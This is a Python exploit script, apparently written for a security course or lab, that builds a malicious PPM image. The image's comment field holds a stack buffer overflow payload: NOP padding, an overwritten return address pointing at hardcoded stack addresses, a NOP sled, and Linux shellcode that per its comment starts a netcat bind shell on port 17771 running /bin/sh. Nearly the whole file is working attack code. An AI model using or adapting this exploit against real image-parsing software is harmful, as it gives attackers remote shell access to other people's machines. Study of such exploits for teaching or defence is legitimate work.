from pwn import p32
import sys

# buffer_start = 0xffffd0ed #default given

# buffer_start = 0xffffd05b #gdb
buffer_start = 0xffffd01b #direct run

buffer_offset = 109

word_size = 4
nop_sled_size = 15

# /bin/nc -lvp 17771 -e /bin/sh
shellcode = b"\x31\xc0\x31\xd2\x50\x68\x37\x37\x37\x31\x68\x2d\x76\x70\x31\x89\xe6\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68\x2d\x6c\x65\x2f\x89\xe7\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x52\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80"

# you may need to modify these values
buffer_bytes = b'\x90' * (buffer_offset - 1)
ebp_bytes = b'\x90' * word_size
return_address = p32(buffer_start + buffer_offset + (2 * word_size))

print(f"Return Address: {return_address}")

numeric_return_address = buffer_start + buffer_offset + (2 * word_size)
print(f"Return Address (hex): {hex(numeric_return_address)}")

nop_sled = b'\x90' * nop_sled_size

payload = buffer_bytes + ebp_bytes + return_address + nop_sled + shellcode

# need to create a ppm image file that contains this payload as a comment
with open("payload.ppm", "wb") as f:
    f.write(b"P6\n")
    f.write(b"3 2\n")
    f.write(b"255\n")
    f.write(b"# " + payload + b"\n")
    f.write(b"\x00\x00\x00\x00\x00\x00")
    f.write(b"\x00\x00\x00\x00\x00\x00")

print()
# print the words of the payload, in hex. 2 words per line
for i in range(0, len(payload), 8):
    print(f"0x{payload[i:i+4].hex()} 0x{payload[i+4:i+8].hex()}")
